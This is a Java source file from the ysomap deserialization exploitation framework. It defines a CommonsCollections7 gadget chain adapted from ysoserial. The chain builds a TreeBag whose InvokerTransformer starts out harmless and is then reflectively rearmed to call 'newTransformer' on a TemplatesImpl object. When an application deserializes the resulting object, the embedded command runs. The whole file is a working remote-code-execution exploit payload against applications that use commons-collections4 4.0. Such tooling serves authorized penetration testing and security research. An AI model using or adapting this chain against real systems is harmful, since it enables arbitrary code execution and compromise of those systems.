package ysomap.core.payload.java.collections;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.collections4.bag.TreeBag;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;
import ysomap.common.annotation.Authors;
import ysomap.common.annotation.Dependencies;
import ysomap.common.annotation.Payloads;
import ysomap.common.annotation.Require;
import ysomap.core.bean.Bullet;
import ysomap.core.bean.Payload;
import ysomap.core.bullet.jdk.TemplatesImplBullet;
import ysomap.core.util.ReflectionHelper;

/**
 * from ysoserial CommonsCollection8
 * @author wh1t3P1g
 * @since 2020/2/18
 */
@SuppressWarnings({"rawtypes","unchecked"})
@Payloads
@Dependencies({"org.apache.commons:commons-collections4:4.0"})
@Require(bullets = {"TemplatesImplBullet"}, param = false)
@Authors({ Authors.NAVALORENZO })
public class CommonsCollections7 extends Payload<TreeBag> {

    @Override
    public boolean checkObject(Object obj) {
        return obj instanceof TemplatesImpl;
    }

    @Override
    public TreeBag pack(Object obj) throws Exception {
        // setup harmless chain
        final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);

        // define the comparator used for sorting
        TransformingComparator comp = new TransformingComparator(transformer);

        // prepare CommonsCollections object entry point
        TreeBag tree = new TreeBag(comp);
        tree.add(obj);

        // arm transformer
        ReflectionHelper.setFieldValue(transformer, "iMethodName", "newTransformer");

        return tree;
    }

    @Override
    public Bullet getDefaultBullet(String command) throws Exception {
        return new TemplatesImplBullet().set("body", command);
    }
}
